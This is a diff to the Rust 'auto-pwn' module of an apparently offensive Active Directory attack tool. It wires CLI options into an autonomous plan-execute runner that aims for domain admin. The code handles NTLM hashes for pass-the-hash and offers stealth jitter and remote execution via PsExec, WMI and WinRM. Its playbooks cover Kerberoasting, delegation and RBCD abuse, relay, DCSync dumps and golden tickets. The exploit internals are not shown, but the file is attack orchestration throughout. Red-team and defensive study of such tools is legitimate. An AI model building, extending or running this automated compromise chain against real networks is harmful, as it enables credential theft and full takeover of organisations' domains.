@@ -1,13 +1,13 @@
-//! Automated attack chain — wired to overthrone-pilot's Planner + Executor.
+//! Autonomous attack chain entry point.
+//!
+//! The `auto-pwn` CLI subcommand dispatches here, which delegates to
+//! `overthrone_pilot::runner` for plan–execute loops, Q-learning adaptation,
+//! playbook execution, and session management.
 
-use crate::auth::Credentials;
 use crate::banner;
 use colored::Colorize;
-use overthrone_pilot::executor::execute_step;
-use overthrone_pilot::goals::{AttackGoal, EngagementState};
-use overthrone_pilot::planner::Planner;
-use tracing::info;
 
+/// Remote execution method preference.
 #[derive(Debug, Clone, clap::ValueEnum)]
 pub enum ExecMethod {
     PsExec,
@@ -29,270 +29,214 @@ impl std::fmt::Display for ExecMethod {
     }
 }
 
-#[allow(dead_code)] // AutoPwn module planned for future implementation
-pub struct AutoPwnConfig {
-    pub dchost: String,
-    pub creds: Credentials,
+/// CLI-argument shim that feeds into the pilot runner.
+/// Constructed by `cmd_autopwn` in main.rs from parsed subcommand fields.
+#[derive(Debug, Clone)]
+pub struct AutoPwnArgs {
     pub target: String,
+    pub method: ExecMethod,
     pub stealth: bool,
-    pub dryrun: bool,
-    pub exec_method: ExecMethod,
+    pub dry_run: bool,
+    pub max_stage: MaxStageArg,
+    pub adaptive: AdaptiveModeArg,
+    pub q_table: String,
+    pub jitter_ms: u64,
+    pub ldaps: bool,
+    pub timeout: u64,
+    pub playbook: Option<PlaybookArg>,
+    pub config: Option<String>,
+    pub resume: Option<String>,
+    pub bootstrap_no_creds: bool,
+    pub userlist: Option<String>,
+    pub use_ldap: bool,
+    pub concurrency: usize,
 }
 
-#[allow(dead_code)]
-pub struct AutoPwnResult {
-    pub stages_completed: usize,
-    pub domain_admin_achieved: bool,
-    pub compromised_hosts: Vec<String>,
-    pub credentials_found: Vec<String>,
-    pub errors: Vec<String>,
+/// Maximum stage the autonomous pipeline should attempt to reach.
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+pub enum MaxStageArg {
+    Enumerate,
+    Attack,
+    Escalate,
+    Lateral,
+    Loot,
+    Cleanup,
 }
 
-#[allow(dead_code)]
-pub async fn run(config: AutoPwnConfig) -> AutoPwnResult {
-    banner::print_module_banner("AUTOPWN");
+/// Adaptive planning engine mode.
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+pub enum AdaptiveModeArg {
+    /// Pure heuristic engine (original)
+    Heuristic,
+    /// Pure Q-learning (falls back to heuristic for unknown states)
+    Qlearning,
+    /// Hybrid — Q-learner with epsilon-greedy heuristic fallback (recommended)
+    Hybrid,
+}
 
-    let mut result = AutoPwnResult {
-        stages_completed: 0,
-        domain_admin_achieved: false,
-        compromised_hosts: Vec::new(),
-        credentials_found: Vec::new(),
-        errors: Vec::new(),
+/// Predefined playbooks.
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+pub enum PlaybookArg {
+    FullRecon,
+    RoastAndCrack,
+    DelegationAbuse,
+    RbcdChain,
+    CoerceAndRelay,
+    LateralPivot,
+    DcSyncDump,
+    GoldenTicket,
+    FullAutoPwn,
+}
+
+/// Build the [`overthrone_pilot::runner::AutoPwnConfig`] from CLI arguments
+/// and credentials, then run the pilot.
+pub async fn run(
+    dc: String,
+    creds: Option<crate::auth::Credentials>,
+    discovered_domain: Option<String>,
+    args: &AutoPwnArgs,
+    initial_state: Option<overthrone_pilot::goals::EngagementState>,
+) -> i32 {
+    let pilot_exec = match args.method {
+        ExecMethod::Auto => overthrone_pilot::runner::ExecMethod::Auto,
+        ExecMethod::PsExec => overthrone_pilot::runner::ExecMethod::PsExec,
+        ExecMethod::SmbExec => overthrone_pilot::runner::ExecMethod::SmbExec,
+        ExecMethod::WmiExec => overthrone_pilot::runner::ExecMethod::WmiExec,
+        ExecMethod::WinRm => overthrone_pilot::runner::ExecMethod::WinRm,
     };
 
-    println!(
-        "  {} Target DC: {}",
-        "▸".bright_black(),
-        config.dchost.cyan()
-    );
-    println!(
-        "  {} Creds:     {}",
-        "▸".bright_black(),
-        config.creds.display_summary().cyan()
-    );
-    println!(
-        "  {} Goal:      {}",
-        "▸".bright_black(),
-        config.target.yellow()
-    );
-    println!(
-        "  {} Method:    {}",
-        "▸".bright_black(),
-        config.exec_method.to_string().cyan()
-    );
-    if config.dryrun {
-        banner::print_warn("DRY RUN — will plan but not exploit");
+    let pilot_stage = match args.max_stage {
+        MaxStageArg::Enumerate => overthrone_pilot::runner::Stage::Enumerate,
+        MaxStageArg::Attack => overthrone_pilot::runner::Stage::Attack,
+        MaxStageArg::Escalate => overthrone_pilot::runner::Stage::Escalate,
+        MaxStageArg::Lateral => overthrone_pilot::runner::Stage::Lateral,
+        MaxStageArg::Loot => overthrone_pilot::runner::Stage::Loot,
+        MaxStageArg::Cleanup => overthrone_pilot::runner::Stage::Cleanup,
+    };
+
+    let pilot_creds = if let Some(creds) = creds.as_ref() {
+        if let Some(hash) = creds.nthash() {
+            overthrone_pilot::runner::Credentials::ntlm_hash(&creds.domain, &creds.username, hash)
+        } else {
+            overthrone_pilot::runner::Credentials::password(
+                &creds.domain,
+                &creds.username,
+                creds.password().unwrap_or(""),
+            )
+        }
+    } else {
+        let domain = discovered_domain.clone().unwrap_or_default();
+        overthrone_pilot::runner::Credentials::password(&domain, "", "")
+    };
+
+    let pilot_config = overthrone_pilot::runner::AutoPwnConfig {
+        dc_host: dc.clone(),
+        creds: pilot_creds,
+        target: args.target.clone(),
+        max_stage: pilot_stage,
+        stealth: args.stealth,
+        dry_run: args.dry_run,
+        exec_method: pilot_exec,
+        jitter_ms: args.jitter_ms,
+        use_ldaps: args.ldaps,
+        timeout: args.timeout,
+        #[cfg(feature = "qlearn")]
+        adaptive_mode: match args.adaptive {
+            AdaptiveModeArg::Heuristic => overthrone_pilot::qlearner::AdaptiveMode::Heuristic,
+            AdaptiveModeArg::Qlearning => overthrone_pilot::qlearner::AdaptiveMode::QLearning,
+            AdaptiveModeArg::Hybrid => overthrone_pilot::qlearner::AdaptiveMode::Hybrid,
+        },
+        #[cfg(feature = "qlearn")]
+        q_table_path: std::path::PathBuf::from(&args.q_table),
+        initial_state,
+    };
+
+    let pilot_domain_display = match creds {
+        Some(ref c) => c.domain.clone(),
+        None => discovered_domain.clone().unwrap_or_default(),
+    };
+
+    println!("{} Target:    {}", "🎯".bright_black(), args.target.cyan());
+    println!("{} DC:        {}", "🏰".bright_black(), dc.cyan());
+    if !pilot_domain_display.is_empty() {
+        println!(
+            "{} Domain:    {}",
+            "🌐".bright_black(),
+            pilot_domain_display.cyan()
+        );
     }
+    println!("{} Method:    {:?}", "🔧".bright_black(), args.method);
+    println!("{} Max Stage: {:?}", "📊".bright_black(), args.max_stage);
+    println!("{} Adaptive:  {:?}", "🧠".bright_black(), args.adaptive);
+    println!(
+        "{} Stealth:   {}",
+        "🥷".bright_black(),
+        if args.stealth {
+            "ON".green()
+        } else {
+            "OFF".yellow()
+        }
+    );
+    println!(
+        "{} Dry Run:   {}",
+        "📝".bright_black(),
+        if args.dry_run {
+            "YES".yellow()
+        } else {
+            "NO".dimmed()
+        }
+    );
     println!();
 
-    // Build ExecContext
-    let mut ctx = match config
-        .creds
-        .to_exec_context(&config.dchost, false, config.dryrun)
-    {
-        Ok(c) => c,
-        Err(e) => {
-            banner::print_fail(&format!("Failed to build execution context: {}", e));
-            result.errors.push(e);
-            return result;
-        }
-    };
-
-    // ── LDAP Pre-flight Check ──
-    if !config.dryrun {
-        let ldap_result = match config.creds.secret_and_hash_flag() {
-            Ok((secret, true)) => {
-                // PtH path — use NTLM hash bind
-                overthrone_core::proto::ldap::LdapSession::connect_with_hash(
-                    &config.dchost,
-                    &config.creds.domain,
-                    &config.creds.username,
-                    &secret,
-                    false,
-                )
-                .await
+    // If a playbook was requested, run that instead of goal-driven autopwn
+    if let Some(pb) = args.playbook {
+        let playbook_id = match pb {
+            PlaybookArg::FullRecon => overthrone_pilot::playbook::PlaybookId::FullRecon,
+            PlaybookArg::RoastAndCrack => overthrone_pilot::playbook::PlaybookId::RoastAndCrack,
+            PlaybookArg::DelegationAbuse => overthrone_pilot::playbook::PlaybookId::DelegationAbuse,
+            PlaybookArg::RbcdChain => overthrone_pilot::playbook::PlaybookId::RbcdChain,
+            PlaybookArg::CoerceAndRelay => overthrone_pilot::playbook::PlaybookId::CoerceAndRelay,
+            PlaybookArg::LateralPivot => overthrone_pilot::playbook::PlaybookId::LateralPivot,
+            PlaybookArg::DcSyncDump => overthrone_pilot::playbook::PlaybookId::DcSyncDump,
+            PlaybookArg::GoldenTicket => {
+                overthrone_pilot::playbook::PlaybookId::GoldenTicketPersist
             }
-            Ok((secret, false)) => {
-                // Cleartext password path
-                overthrone_core::proto::ldap::LdapSession::connect(
-                    &config.dchost,
-                    &config.creds.domain,
-                    &config.creds.username,
-                    &secret,
-                    false,
-                )
-                .await
-            }
-            Err(e) => Err(overthrone_core::OverthroneError::Auth(e)),
+            PlaybookArg::FullAutoPwn => overthrone_pilot::playbook::PlaybookId::FullAutoPwn,
         };
-
-        match ldap_result {
-            Ok(mut session) => {
-                banner::print_info(&format!("LDAP pre-flight OK ({})", session.bind_type));
-                let _ = session.disconnect().await;
-            }
-            Err(e) => {
-                banner::print_warn(&format!(
-                    "LDAP pre-flight failed: {}. LDAP-dependent steps will be skipped.",
-                    e
-                ));
-                ctx.ldap_available = false;
-            }
-        }
-    }
-
-    // Build initial EngagementState
-    let mut state = EngagementState {
-        dc_ip: Some(config.dchost.clone()),
-        ..Default::default()
-    };
-
-    // Determine goal
-    let goal = match config.target.to_lowercase().as_str() {
-        "recon" | "recon-only" => AttackGoal::ReconOnly,
-        "ntds" | "dump-ntds" => AttackGoal::DumpNtds {
-            target_dc: Some(config.dchost.clone()),
-        },
-        _ => AttackGoal::DomainAdmin {
-            target_group: config.target.clone(),
-        },
-    };
-
-    // Create Planner
-    let planner = Planner::new(config.stealth);
-    let mut failed_actions: Vec<String> = Vec::new();
-    let mut total_steps_run: usize = 0;
-    let max_replan_rounds = 15;
-
-    // Adaptive Plan → Execute Loop
-    for round in 0..max_replan_rounds {
-        info!("AutoPwn round {}", round + 1);
-
-        let plan = planner.plan(&goal, &state, &failed_actions, ctx.ldap_available);
-
-        if plan.steps.is_empty() {
-            if round == 0 {
-                banner::print_warn("Planner produced no steps — nothing to do");
-            } else {
-                banner::print_info("All viable attack paths exhausted");
-            }
-            break;
-        }
-
-        if round == 0 {
-            println!(
-                "\n  {} {} steps planned (noise: {})\n",
-                "▶".red().bold(),
-                plan.steps.len(),
-                plan.estimated_noise,
-            );
-        }
-
-        let mut state_changed = false;
-
-        for step in &plan.steps {
-            if step.executed {
-                continue;
-            }
-
-            println!(
-                "  {} [{}] {}",
-                "▶".red().bold(),
-                step.stage.to_string().dimmed(),
-                step.description.bold()
-            );
-
-            if config.dryrun {
-                println!("    {} {}", "↳".dimmed(), "DRY RUN — skipped".dimmed());
-                total_steps_run += 1;
-                continue;
-            }
-
-            // Execute the step — pass references
-            let step_result = execute_step(step, &ctx, &mut state).await;
-
-            total_steps_run += 1;
-
-            if step_result.success {
-                banner::print_success(&step_result.output);
-
-                if step_result.new_credentials > 0 {
-                    result
-                        .credentials_found
-                        .push(format!("{} new creds", step_result.new_credentials));
-                    state_changed = true;
-                }
-                if step_result.new_admin_hosts > 0 {
-                    result
-                        .compromised_hosts
-                        .push(format!("{} new hosts", step_result.new_admin_hosts));
-                    state_changed = true;
-                }
-            } else {
-                banner::print_fail(&step_result.output);
-                let action_key = step.action_key().to_string();
-                if !failed_actions.contains(&action_key) {
-                    failed_actions.push(action_key);
-                }
-            }
-
-            if state_changed {
-                banner::print_info("State changed — replanning...");
-                break;
-            }
-        }
-
-        // Check if goal achieved — has_domain_admin is a field, not a method
-        if state.has_domain_admin {
-            result.domain_admin_achieved = true;
-            // Find the DA user and host
-            let da_user = state.da_user.as_deref().unwrap_or("unknown");
-            let da_host = state
-                .admin_hosts
-                .iter()
-                .next()
-                .map(|h| h.as_str())
-                .unwrap_or("unknown");
-            banner::print_da_achieved(da_user, da_host);
-            break;
-        }
-
-        if !state_changed && !config.dryrun {
-            break;
-        }
-    }
-
-    // Collect final results
-    result.stages_completed = total_steps_run;
-    result.compromised_hosts = state.admin_hosts.iter().cloned().collect();
-    result.credentials_found = state
-        .credentials
-        .values()
-        .map(|c| format!("{}:{}", c.username, c.secret_type))
-        .collect();
-
-    // Summary
-    println!(
-        "\n{} {} {}\n",
-        "━━━".yellow().bold(),
-        "RESULTS".yellow().bold(),
-        "━━━".yellow().bold(),
-    );
-    println!(
-        "  Steps: {} | DA: {} | Hosts: {} | Creds: {}",
-        total_steps_run.to_string().cyan(),
+        banner::print_info(&format!("Running playbook: {}", playbook_id));
+        let result = overthrone_pilot::runner::run_playbook(playbook_id, &pilot_config).await;
         if result.domain_admin_achieved {
-            "✓".green()
-        } else {
-            "✗".red()
-        },
-        result.compromised_hosts.len().to_string().cyan(),
-        result.credentials_found.len().to_string().cyan(),
-    );
-
-    if !result.errors.is_empty() {
-        println!("  Errors: {}", result.errors.len().to_string().red());
+            banner::print_da_achieved(result.state.da_user.as_deref().unwrap_or("unknown"), &dc);
+            return 0;
+        }
+        banner::print_info("Playbook completed");
+        return if result.steps_succeeded > 0 { 0 } else { 1 };
     }
 
-    result
+    // Run the full autonomous attack chain via pilot runner
+    let result = overthrone_pilot::runner::run(pilot_config).await;
+
+    // Auto-save session state
+    {
+        let save_path = crate::session_store::auto_session_path(
+            &dc,
+            result.state.domain.as_deref().unwrap_or("unknown"),
+        );
+        match crate::session_store::save_session(&save_path, &result.state) {
+            Ok(_) => banner::print_info(&format!("Session saved → {}", save_path.display())),
+            Err(e) => banner::print_warn(&format!("Could not save session: {}", e)),
+        }
+    }
+
+    if result.domain_admin_achieved {
+        0
+    } else {
+        println!(
+            "\n{} Goal not achieved. {} steps succeeded, {} failed.",
+            "⚠".yellow().bold(),
+            result.steps_succeeded.to_string().green(),
+            result.steps_failed.to_string().red(),
+        );
+        1
+    }
 }
